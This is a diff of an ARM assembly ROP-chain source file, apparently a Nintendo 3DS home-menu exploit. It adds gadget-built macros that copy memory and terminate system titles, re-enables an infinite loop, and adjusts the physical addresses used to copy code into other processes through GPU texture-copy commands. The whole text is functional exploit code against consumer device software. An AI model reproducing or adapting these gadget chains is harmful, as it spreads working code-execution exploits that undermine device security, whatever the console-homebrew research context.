@@ -62,6 +62,19 @@ SNS_CODE_OFFSET equ 0x0001D300
 	.word MENU_MEMCPY
 .endmacro
 
+; this memcpy's the size bytes that immediately preceed its call
+.macro memcpy_r0_lr_prev,size
+	.word 0x00214988 ; pop {r1, pc}
+		.word (MENU_OBJECT_LOC + (. - 4 - size) - object) ; r1 (src)
+	.word 0x00150160 ; pop {r2, r3, r4, r5, r6, pc}
+		.word size ; r2 (size)
+		.word 0xDEADBABE ; r3 (garbage)
+		.word 0xDEADBABE ; r4 (garbage)
+		.word 0xDEADBABE ; r5 (garbage)
+		.word 0xDEADBABE ; r6 (garbage)
+	.word MENU_MEMCPY
+.endmacro
+
 .macro memcpy,dst,src,size
 	set_lr MENU_NOP
 	.word 0x001575ac ; pop {r0, pc}
@@ -157,6 +170,24 @@ SNS_CODE_OFFSET equ 0x0001D300
 		.word 0xDEADBABE ; r4 (garbage)
 .endmacro
 
+.macro nss_terminate_tid,tid_low,tid_high,timeout_low
+	get_cmdbuf
+	.word 0x00159cdc ; pop {r4, r5, r6, r7, r8, pc}
+		; nss_terminate_tid_cmd_buf:
+		.word 0x00110100 ; command header
+		.word tid_low ; tid low
+		.word tid_high ; tid high
+		.word timeout_low ; timeout low
+		.word 0x00000000 ; timeout high
+	memcpy_r0_lr_prev (4 * 5)
+	.word 0x001575ac ; pop {r0, pc}
+		.word MENU_NSS_HANDLE ; r0 (ns:s handle)
+	.word 0x00101c74 ; pop {r4, pc}
+		.word MENU_OBJECT_LOC ; r4 (dummy but address needs to be valid/readable)
+	.word 0x0013a48C ; ldr r0, [r0] ; svc 0x00000032 ; and r1, r0, #-2147483648 ; cmp r1, #0 ; ldrge r0, [r4, #4] ; pop {r4, pc}
+		.word 0xDEADBABE ; r4 (garbage)
+.endmacro
+
 .macro infloop
 	set_lr 0x00207080 ; bx lr
 	.word 0x00207080 ; bx lr
@@ -166,6 +197,7 @@ SNS_CODE_OFFSET equ 0x0001D300
 
 	object:
 	rop: ; real ROP starts here
+
 		; launch titles to fill space
 			nss_launch_title 0x20008802, 0x00040030 ; launch SKATER applet
 			nss_launch_title 0x0000c002, 0x00040030 ; launch swkbd applet
@@ -199,11 +231,17 @@ SNS_CODE_OFFSET equ 0x0001D300
 		; release gsp rights
 			gsp_release_right
 
+		; kill off useless launched titles
+			nss_terminate_tid 0x00008d02, 0x00040030, 100*1000*1000 ; kill friend
+			nss_terminate_tid 0x0000c002, 0x00040030, 100*1000*1000 ; kill swkbd
+			nss_terminate_tid 0x20008802, 0x00040030, 100*1000*1000 ; kill SKATER
+			nss_terminate_tid 0x00003702, 0x00040130, 100*1000*1000 ; kill ro
+
 		; sleep for ever and ever
 			sleep 0xffffffff, 0x0fffffff
 
-		; ; infinite loop just in case
-		; 	infloop
+		; infinite loop just in case
+			infloop
 
 		; crash
 			.word 0xDEADBABE
@@ -223,7 +261,7 @@ SNS_CODE_OFFSET equ 0x0001D300
 	gxCommandCode:
 		.word 0x00000004 ; command header (SetTextureCopy)
 		.word MENU_OBJECT_LOC + snsCode - object ; source address
-		.word 0x3D00D300 ; destination address (PA  for 0x0011D300)
+		.word 0x3D00D300 ; destination address (PA for 0x0011D300)
 		.word 0x00000D00 ; size
 		.word 0xFFFFFFFF ; dim in
 		.word 0xFFFFFFFF ; dim out
@@ -233,7 +271,7 @@ SNS_CODE_OFFSET equ 0x0001D300
 	gxCommandAppHook:
 		.word 0x00000004 ; command header (SetTextureCopy)
 		.word MENU_OBJECT_LOC + appHook - object ; source address
-		.word 0x37704be0 ; destination address (PA  for 0x00104be0)
+		.word 0x37900000 + 0x00104be0 - 0x00100000 ; destination address (PA for 0x00104be0)
 		.word 0x00000200 ; size
 		.word 0xFFFFFFFF ; dim in
 		.word 0xFFFFFFFF ; dim out
@@ -243,7 +281,7 @@ SNS_CODE_OFFSET equ 0x0001D300
 	gxCommandAppCode:
 		.word 0x00000004 ; command header (SetTextureCopy)
 		.word MENU_OBJECT_LOC + appCode - object ; source address
-		.word 0x37800000 ; destination address (PA  for 0x00200000)
+		.word 0x37900000 + 0x00200000 - 0x00100000 ; destination address (PA for 0x00200000)
 		.word 0x00010000 ; size
 		.word 0xFFFFFFFF ; dim in
 		.word 0xFFFFFFFF ; dim out
